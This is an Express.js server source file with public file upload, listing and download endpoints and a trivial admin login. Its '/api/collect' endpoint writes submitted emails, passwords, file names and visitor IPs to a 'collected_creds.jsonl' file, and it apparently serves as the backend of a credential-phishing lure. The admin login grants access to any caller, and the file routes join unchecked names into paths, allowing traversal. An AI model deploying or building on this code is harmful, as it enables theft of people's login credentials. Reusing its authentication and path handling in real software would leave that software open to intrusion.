// server.js (full)
const express = require('express');
const multer = require('multer');
const fs = require('fs-extra');
const path = require('path');
const cookieParser = require('cookie-parser');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOAD_DIR = path.join(__dirname, 'uploads');
const PUBLIC_DIR = path.join(__dirname, 'public');
const COLLECT_FILE = path.join(__dirname, 'collected_creds.jsonl'); // each line: JSON

fs.ensureDirSync(UPLOAD_DIR);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(PUBLIC_DIR));

// multer config
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
  filename: (req, file, cb) => {
    const id = Date.now() + '-' + Math.random().toString(36).slice(2,9);
    const ext = path.extname(file.originalname);
    cb(null, id + ext);
  }
});
const upload = multer({ storage });

// --- simple admin state (for local testing) ---
let adminLoggedIn = false;
app.post('/api/admin/login', (req, res) => { adminLoggedIn = true; res.json({ ok:true }); });
app.post('/api/admin/logout', (req, res) => { adminLoggedIn = false; res.json({ ok:true }); });

// admin upload (requires adminLoggedIn)
app.post('/api/admin/upload', (req, res, next) => {
  if(!adminLoggedIn) return res.status(401).json({ error: 'Admin not logged in' });
  next();
}, upload.single('file'), (req, res) => {
  if(!req.file) return res.status(400).json({ error: 'No file uploaded' });
  res.json({ ok:true, filename:req.file.filename, original:req.file.originalname });
});

// admin delete
app.post('/api/admin/delete', (req, res) => {
  if(!adminLoggedIn) return res.status(401).json({ error: 'Admin not logged in' });
  const { filename } = req.body;
  if(!filename) return res.status(400).json({ error: 'filename required' });
  const p = path.join(UPLOAD_DIR, filename);
  if(!fs.existsSync(p)) return res.status(404).json({ error: 'file not found' });
  fs.unlinkSync(p);
  res.json({ ok:true });
});

// list files (public)
app.get('/api/files', async (req, res) => {
  const files = await fs.readdir(UPLOAD_DIR);
  const list = files.map(f => ({ filename: f, url: '/files/' + encodeURIComponent(f) }));
  res.json({ files: list });
});

// serve files (public)
app.get('/files/:name', (req, res) => {
  const p = path.join(UPLOAD_DIR, req.params.name);
  if(!fs.existsSync(p)) return res.status(404).end();
  res.sendFile(p);
});


// NEW: collect credentials (no validation) — append JSON per line
app.post('/api/collect', async (req, res) => {
  try {
    const { email, password, filename, ts } = req.body || {};
    const record = {
      ts: ts || new Date().toISOString(),
      email: email || null,
      password: password || null,
      filename: filename || null,
      ip: req.ip
    };
    // append as a line-delimited JSON (safe to read later)
    await fs.appendFile(COLLECT_FILE, JSON.stringify(record) + '\n', { encoding: 'utf8' });
    return res.json({ ok:true });
  } catch(err) {
    console.error('collect error', err);
    return res.status(500).json({ error: 'server error' });
  }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
